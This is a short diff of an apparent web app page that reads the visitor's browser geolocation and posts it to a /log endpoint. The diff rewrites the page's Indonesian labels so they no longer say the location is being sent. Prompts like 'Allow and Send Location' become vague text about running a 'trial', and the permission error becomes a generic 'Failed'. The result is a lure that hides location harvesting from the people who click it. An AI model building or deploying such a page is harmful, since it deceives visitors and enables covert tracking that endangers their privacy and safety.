@@ -20,13 +20,13 @@ def index():
         <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
     </head>
     <body>
-        <h3>Tekan tombol di bawah untuk mengirim lokasi 📍</h3>
-        <button onclick="getLocation()">Izinkan dan Kirim Lokasi</button>
+        <h3>Klik Tombol Dibawah Untuk Melakukan Percobaan</h3>
+        <button onclick="getLocation()">Gasss Abangku</button>
         <p id="status"></p>
 
         <script>
         function getLocation() {
-            document.getElementById('status').innerText = "Meminta izin lokasi...";
+            document.getElementById('status').innerText = "Loading........";
             navigator.geolocation.getCurrentPosition(pos => {
                 fetch("/log", {
                     method: "POST",
@@ -40,7 +40,7 @@ def index():
                     document.getElementById('status').innerText = msg;
                 });
             }, err => {
-                document.getElementById('status').innerText = "❌ Izin lokasi ditolak.";
+                document.getElementById('status').innerText = "❌ Gagal :(";
             });
         }
         </script>
